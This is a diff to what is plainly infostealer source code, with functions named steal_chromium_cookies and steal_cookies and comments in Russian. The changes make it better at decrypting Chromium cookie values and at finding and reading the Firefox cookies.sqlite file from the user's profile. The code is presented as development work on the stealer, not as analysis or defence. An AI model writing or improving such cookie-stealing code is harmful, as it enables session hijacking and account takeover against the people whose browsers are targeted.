@@ -449,18 +449,24 @@ def steal_chromium_cookies(browser_name, profile_path):
             try:
                 host, name, value, path, expires, secure, encrypted_value = item
                 
-                # Всегда используем encrypted_value для дешифровки
-                cookie_value = encrypted_value if encrypted_value else value
-                
-                if cookie_value and isinstance(cookie_value, bytes):
-                    decrypted_value = decrypt_password(cookie_value, key)
+                # Приоритет 1: Расшифровать encrypted_value
+                if encrypted_value and isinstance(encrypted_value, bytes):
+                    decrypted_value = decrypt_password(encrypted_value, key)
+                    if decrypted_value:
+                        cookie_value = decrypted_value
+                    else:
+                        cookie_value = value if value else ""
                 else:
-                    decrypted_value = cookie_value
+                    cookie_value = value if value else ""
+                
+                # Если получили пустую строку, пробуем value как есть
+                if not cookie_value and value:
+                    cookie_value = value
                 
                 cookies.append({
                     'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
                     'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
-                    'value': decrypted_value if decrypted_value is not None else "",
+                    'value': cookie_value,
                     'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
                     'expires': expires,
                     'secure': bool(secure)
@@ -556,14 +562,18 @@ def steal_cookies():
                     try:
                         # Указываем явный путь к профилю Firefox
                         firefox_profile = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
+                        cookie_path = None
+                        
                         if firefox_profile.exists():
                             # Ищем первый профиль
                             for profile_dir in firefox_profile.iterdir():
                                 if profile_dir.is_dir() and "default" in profile_dir.name.lower():
-                                    jar = browser_cookie3.firefox(cookie_file=str(profile_dir / "cookies.sqlite"))
-                                    break
-                            else:
-                                jar = browser_cookie3.firefox()
+                                    cookie_path = profile_dir / "cookies.sqlite"
+                                    if cookie_path.exists():
+                                        break
+                            
+                        if cookie_path and cookie_path.exists():
+                            jar = browser_cookie3.firefox(cookie_file=str(cookie_path))
                         else:
                             jar = browser_cookie3.firefox()
                             
